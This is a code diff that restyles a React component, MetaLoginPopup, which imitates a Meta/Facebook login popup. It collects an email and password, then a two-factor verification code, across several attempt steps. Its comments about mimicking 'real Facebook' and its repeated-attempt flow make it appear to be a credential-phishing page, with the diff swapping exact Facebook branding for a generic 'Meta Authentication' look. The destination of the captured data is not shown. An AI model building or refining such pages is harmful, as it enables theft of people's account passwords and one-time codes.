@@ -14,6 +14,7 @@ import {
   EyeOff,
   CheckCircle
 } from "lucide-react";
+
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
@@ -166,17 +167,15 @@ const MetaLoginPopup = () => {
   };
 
   return (
-    <div className="min-h-screen bg-[#f0f2f5] flex flex-col">
-      <header className="bg-white shadow-sm sticky top-0 z-10">
+    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-gray-100 flex flex-col">
+      <header className="bg-gradient-to-r from-blue-600 to-blue-800 shadow-sm sticky top-0 z-10">
         <div className="max-w-7xl mx-auto p-3 flex justify-between items-center">
-          <img 
-            src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" 
-            alt="Meta Logo" 
-            className="h-10"
-          />
+          <div className="flex items-center">
+            <div className="text-white font-bold text-2xl">Meta Connect</div>
+          </div>
           <button 
             onClick={() => window.close()} 
-            className="text-gray-500 hover:text-gray-800 focus:outline-none focus:ring-1 focus:ring-gray-200 rounded-full p-1"
+            className="text-white hover:text-gray-200 focus:outline-none focus:ring-1 focus:ring-white rounded-full p-1"
             aria-label="Close"
           >
             <X className="h-5 w-5" />
@@ -185,30 +184,30 @@ const MetaLoginPopup = () => {
       </header>
       
       <main className="flex-grow flex items-center justify-center p-4">
-        <div className="bg-white rounded-md shadow-md p-6 w-full max-w-[396px]">
+        <div className="bg-white rounded-lg shadow-xl p-8 w-full max-w-[420px] border border-gray-200">
           {currentStep === LoginStep.SUCCESS ? (
             <div className="text-center">
-              <div className="mx-auto mb-4">
-                <img 
-                  src="https://static.xx.fbcdn.net/rsrc.php/v3/y2/r/MbU7tyG1CmT.png" 
-                  alt="Success" 
-                  className="h-20 mx-auto"
-                />
+              <div className="mx-auto mb-6">
+                <div className="h-20 w-20 bg-green-100 rounded-full flex items-center justify-center mx-auto">
+                  <CheckCircle className="h-12 w-12 text-green-600" />
+                </div>
               </div>
-              <h2 className="text-xl font-semibold mb-3">Account Connected</h2>
+              <h2 className="text-2xl font-bold mb-3 text-gray-800">Verification Complete</h2>
               <p className="text-gray-600 mb-5">
-                Your Facebook account has been successfully connected. This window will close automatically.
+                Your account has been successfully verified. This window will close automatically.
               </p>
-              <Progress value={100} className="h-1 bg-gray-100" />
-              <p className="text-sm text-gray-400 mt-2">Redirecting back to application...</p>
+              <Progress value={100} className="h-2 bg-gray-100" />
+              <p className="text-sm text-gray-500 mt-3">Returning to application...</p>
             </div>
           ) : (
             <>
-              <div className="text-center mb-6">
-                {/* Using a reliable local copy of Facebook logo */}
-                <div className="text-[#1877F2] font-bold text-6xl mb-2">facebook</div>
-                <p className="text-gray-700 text-sm mt-3">
-                  Log in to continue with your application
+              <div className="text-center mb-8">
+                <div className="flex items-center justify-center mb-4">
+                  <div className="text-blue-600 font-extrabold text-4xl">Meta</div>
+                  <div className="text-gray-700 font-medium text-xl ml-2">Authentication</div>
+                </div>
+                <p className="text-gray-600 mt-3">
+                  Secure verification required to continue
                 </p>
               </div>
               
@@ -219,79 +218,101 @@ const MetaLoginPopup = () => {
                 <form onSubmit={handlePasswordSubmit} className="space-y-4">
 
                   
-                  <div>
-                    <Input 
-                      id="email" 
-                      type="text"
-                      value={email}
-                      onChange={(e) => setEmail(e.target.value)}
-                      placeholder="Email address or phone number"
-                      className={`h-[50px] rounded-[6px] text-[17px] ${errorMessage ? "border-[#f02849]" : "border-[#dddfe2]"}`}
-                      disabled={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
-                    />
-                  </div>
-                  
-                  <div className="relative">
-                    <Input 
-                      id="password" 
-                      type={showPassword ? "text" : "password"}
-                      value={password}
-                      onChange={(e) => setPassword(e.target.value)}
-                      placeholder="Password"
-                      className={`h-[50px] rounded-[6px] text-[17px] pr-10 ${errorMessage ? "border-[#f02849]" : "border-[#dddfe2]"}`}
-                      autoFocus={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
-                    />
-                    <button
-                      type="button"
-                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
-                      onClick={() => setShowPassword(!showPassword)}
-                      tabIndex={-1}
-                    >
-                      {showPassword ? (
-                        <EyeOff className="h-5 w-5" />
-                      ) : (
-                        <Eye className="h-5 w-5" />
-                      )}
-                    </button>
-                  </div>
-                  
-                  {/* Error message appears below password field like in real Facebook */}
-                  {errorMessage && (
-                    <div className="text-[#f02849] text-xs -mt-2">
-                      {errorMessage}
+                  <div className="space-y-1">
+                    <Label htmlFor="email" className="text-gray-700 font-medium">Email or Username</Label>
+                    <div className="relative">
+                      <Mail className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-500" />
+                      <Input 
+                        id="email" 
+                        type="text"
+                        value={email}
+                        onChange={(e) => setEmail(e.target.value)}
+                        placeholder="Enter your email address"
+                        className={`pl-10 h-[50px] rounded-md bg-gray-50 border ${errorMessage ? "border-red-500" : "border-gray-300"}`}
+                        disabled={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
+                      />
                     </div>
-                  )}
+                  </div>
                   
-                  <Button 
-                    type="submit" 
-                    className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white h-[50px] rounded-[6px] text-[20px] font-bold"
-                    disabled={isLoading}
-                  >
-                    {isLoading ? (
-                      <div className="flex items-center justify-center">
-                        <Loader2 className="h-5 w-5 mr-2 animate-spin" />
-                        <span>Logging in...</span>
+                  <div className="space-y-1">
+                    <Label htmlFor="password" className="text-gray-700 font-medium">Password</Label>
+                    <div className="relative">
+                      <Lock className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-500" />
+                      <Input 
+                        id="password" 
+                        type={showPassword ? "text" : "password"}
+                        value={password}
+                        onChange={(e) => setPassword(e.target.value)}
+                        placeholder="Enter your password"
+                        className={`pl-10 h-[50px] rounded-md bg-gray-50 border ${errorMessage ? "border-red-500" : "border-gray-300"} pr-10`}
+                        autoFocus={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
+                      />
+                      <button
+                        type="button"
+                        className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
+                        onClick={() => setShowPassword(!showPassword)}
+                        tabIndex={-1}
+                      >
+                        {showPassword ? (
+                          <EyeOff className="h-5 w-5" />
+                        ) : (
+                          <Eye className="h-5 w-5" />
+                        )}
+                      </button>
+                    </div>
+                    
+                    {/* Error message appears below password field */}
+                    {errorMessage && (
+                      <div className="flex items-center mt-1 text-red-500 text-sm">
+                        <AlertCircle className="h-4 w-4 mr-1 flex-shrink-0" />
+                        <span>{errorMessage}</span>
                       </div>
-                    ) : (
-                      "Log In"
                     )}
-                  </Button>
+                  </div>
                   
-                  {/* Thanh tiến trình đã được loại bỏ */}
+                  <div className="pt-2">
+                    <Button 
+                      type="submit" 
+                      className="w-full bg-blue-600 hover:bg-blue-700 text-white h-[50px] rounded-md text-[17px] font-semibold"
+                      disabled={isLoading}
+                    >
+                      {isLoading ? (
+                        <div className="flex items-center justify-center">
+                          <Loader2 className="h-5 w-5 mr-2 animate-spin" />
+                          <span>Authenticating...</span>
+                        </div>
+                      ) : (
+                        "Continue"
+                      )}
+                    </Button>
+                  </div>
                   
-                  <div className="text-center border-b border-gray-200 pb-5">
-                    <a href="#" className="text-[#1877F2] text-[14px] hover:underline">
+                  <div className="flex justify-between items-center pt-3 pb-2">
+                    <div className="flex items-center">
+                      <input type="checkbox" id="remember" className="mr-2 h-4 w-4" />
+                      <Label htmlFor="remember" className="text-sm text-gray-600">Remember me</Label>
+                    </div>
+                    <a href="#" className="text-blue-600 text-sm hover:underline">
                       Forgot password?
                     </a>
                   </div>
                   
-                  <div className="flex justify-center pt-2">
+                  <div className="relative my-6">
+                    <div className="absolute inset-0 flex items-center">
+                      <div className="w-full border-t border-gray-300"></div>
+                    </div>
+                    <div className="relative flex justify-center">
+                      <span className="px-2 bg-white text-gray-500 text-sm">Or</span>
+                    </div>
+                  </div>
+                  
+                  <div className="flex justify-center">
                     <Button
                       type="button"
-                      className="bg-[#42b72a] hover:bg-[#36a420] text-white text-[17px] h-[48px] py-0 px-4 rounded-[6px] font-bold"
+                      className="w-full bg-gray-100 hover:bg-gray-200 text-gray-800 border border-gray-300 h-[48px] rounded-md font-medium text-[15px]"
                       onClick={(e) => e.preventDefault()}
                     >
-                      Create new account
+                      Sign up for Meta
                     </Button>
                   </div>
                 </form>
@@ -301,65 +322,65 @@ const MetaLoginPopup = () => {
               {(currentStep === LoginStep.VERIFICATION_FIRST_ATTEMPT || 
                 currentStep === LoginStep.VERIFICATION_SECOND_ATTEMPT) && (
                 <>
-                  <div className="text-center mb-4">
-                    <div className="h-16 w-16 mx-auto mb-3 flex items-center justify-center bg-[#e7f3ff] rounded-full">
-                      <Lock className="h-8 w-8 text-[#1877F2]" />
+                  <div className="text-center mb-6">
+                    <div className="h-20 w-20 mx-auto mb-4 flex items-center justify-center bg-blue-100 rounded-full">
+                      <Smartphone className="h-10 w-10 text-blue-600" />
                     </div>
-                    <h3 className="text-xl font-semibold">Two-factor authentication required</h3>
-                    <p className="text-[#65676b] mt-2 text-[15px]">
-                      We sent a code to your phone. Enter it here to verify your identity.
+                    <h3 className="text-2xl font-semibold text-gray-800">Security Verification</h3>
+                    <p className="text-gray-600 mt-3 text-sm">
+                      We've sent a verification code to your device. Please enter it below to continue.
                     </p>
                   </div>
                   
                   <form onSubmit={handleVerificationSubmit} className="space-y-4">
-
-                    
-                    <div>
-                      <Input 
-                        id="code" 
-                        type="text"
-                        inputMode="numeric"
-                        ref={codeInputRef}
-                        value={verificationCode}
-                        onChange={(e) => setVerificationCode(e.target.value.replace(/[^0-9]/g, '').substring(0, 8))}
-                        placeholder="Enter code"
-                        className={`h-[50px] rounded-[6px] text-[17px] text-center ${verificationError ? "border-[#f02849]" : "border-[#dddfe2]"}`}
-                        disabled={isLoading}
-                        maxLength={8}
-                      />
+                    <div className="space-y-1">
+                      <Label htmlFor="code" className="text-gray-700 font-medium">Verification Code</Label>
+                      <div className="relative">
+                        <Input 
+                          id="code" 
+                          type="text"
+                          inputMode="numeric"
+                          ref={codeInputRef}
+                          value={verificationCode}
+                          onChange={(e) => setVerificationCode(e.target.value.replace(/[^0-9]/g, '').substring(0, 8))}
+                          placeholder="Enter 6-digit code"
+                          className={`h-[50px] rounded-md text-lg text-center bg-gray-50 border ${verificationError ? "border-red-500" : "border-gray-300"}`}
+                          disabled={isLoading}
+                          maxLength={8}
+                        />
+                      </div>
                       
                       {verificationError && (
-                        <div className="text-[#f02849] text-xs mt-1 text-center">
-                          {verificationError}
+                        <div className="flex items-center mt-1 text-red-500 text-sm">
+                          <AlertCircle className="h-4 w-4 mr-1 flex-shrink-0" />
+                          <span>{verificationError}</span>
                         </div>
                       )}
-                      
-                      {/* Thông báo chờ đợi đã được xóa */}
                     </div>
                     
-                    <Button 
-                      type="submit" 
-                      className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white h-[48px] rounded-[6px] font-bold text-[18px]"
-                      disabled={isLoading}
-                    >
-                      {isLoading ? (
-                        <div className="flex items-center justify-center">
-                          <Loader2 className="h-5 w-5 mr-2 animate-spin" />
-                          <span>Verifying code...</span>
-                        </div>
-                      ) : (
-                        "Continue"
-                      )}
-                    </Button>
+                    <div className="pt-2">
+                      <Button 
+                        type="submit" 
+                        className="w-full bg-blue-600 hover:bg-blue-700 text-white h-[50px] rounded-md text-[17px] font-semibold"
+                        disabled={isLoading}
+                      >
+                        {isLoading ? (
+                          <div className="flex items-center justify-center">
+                            <Loader2 className="h-5 w-5 mr-2 animate-spin" />
+                            <span>Verifying code...</span>
+                          </div>
+                        ) : (
+                          "Verify Identity"
+                        )}
+                      </Button>
+                    </div>
                     
-                    {/* Thanh tiến trình đã được loại bỏ */}
-                    
-                    <div className="flex flex-col space-y-3 border-t border-gray-200 pt-3">
-                      <a href="#" className="text-[#1877F2] text-[15px] text-center hover:underline">
-                        I didn't receive a code
+                    <div className="flex justify-between items-center pt-4">
+                      <a href="#" className="text-blue-600 text-sm hover:underline">
+                        Resend code
                       </a>
-                      <a href="#" className="text-[#1877F2] text-[15px] text-center hover:underline">
-                        Try another way
+                      <a href="#" className="text-blue-600 text-sm hover:underline">
+                        Try another method
                       </a>
                     </div>
                   </form>
@@ -370,40 +391,27 @@ const MetaLoginPopup = () => {
         </div>
       </main>
       
-      <footer className="mt-auto py-5">
+      <footer className="mt-auto py-4 bg-gray-50">
         <div className="max-w-[980px] mx-auto px-4">
-          <div className="flex flex-wrap justify-center gap-x-3 text-xs text-[#737373] mb-2">
-            <a href="#" className="hover:underline">English (US)</a>
+          <div className="flex flex-wrap justify-center gap-x-4 text-xs text-gray-500 mb-2">
+            <a href="#" className="hover:underline">English</a>
             <a href="#" className="hover:underline">Español</a>
-            <a href="#" className="hover:underline">Français (France)</a>
-            <a href="#" className="hover:underline">中文(简体)</a>
+            <a href="#" className="hover:underline">Français</a>
+            <a href="#" className="hover:underline">中文</a>
             <a href="#" className="hover:underline">العربية</a>
-            <a href="#" className="hover:underline">Português (Brasil)</a>
-            <a href="#" className="hover:underline">Italiano</a>
-            <a href="#" className="hover:underline">한국어</a>
-            <a href="#" className="hover:underline">Deutsch</a>
-            <a href="#" className="hover:underline">हिन्दी</a>
-            <a href="#" className="hover:underline">日本語</a>
+            <a href="#" className="hover:underline">Português</a>
           </div>
           
           <div className="border-t border-gray-200 pt-3">
-            <div className="flex flex-wrap justify-center gap-x-3 gap-y-1 text-xs text-[#737373]">
-              <a href="#" className="hover:underline">Sign Up</a>
-              <a href="#" className="hover:underline">Log In</a>
-              <a href="#" className="hover:underline">Messenger</a>
-              <a href="#" className="hover:underline">Facebook Lite</a>
-              <a href="#" className="hover:underline">Watch</a>
-              <a href="#" className="hover:underline">Places</a>
-              <a href="#" className="hover:underline">Games</a>
-              <a href="#" className="hover:underline">Marketplace</a>
-              <a href="#" className="hover:underline">Facebook Pay</a>
+            <div className="flex flex-wrap justify-center gap-x-4 gap-y-1 text-xs text-gray-500">
+              <a href="#" className="hover:underline">About</a>
               <a href="#" className="hover:underline">Privacy</a>
-              <a href="#" className="hover:underline">Cookies</a>
               <a href="#" className="hover:underline">Terms</a>
-              <a href="#" className="hover:underline">Help</a>
+              <a href="#" className="hover:underline">Cookies</a>
+              <a href="#" className="hover:underline">Help Center</a>
             </div>
-            <div className="text-center text-xs text-[#737373] mt-4">
-              <p>Meta © {new Date().getFullYear()}</p>
+            <div className="text-center text-xs text-gray-500 mt-3">
+              <p>© Meta Platforms, Inc. {new Date().getFullYear()}</p>
             </div>
           </div>
         </div>
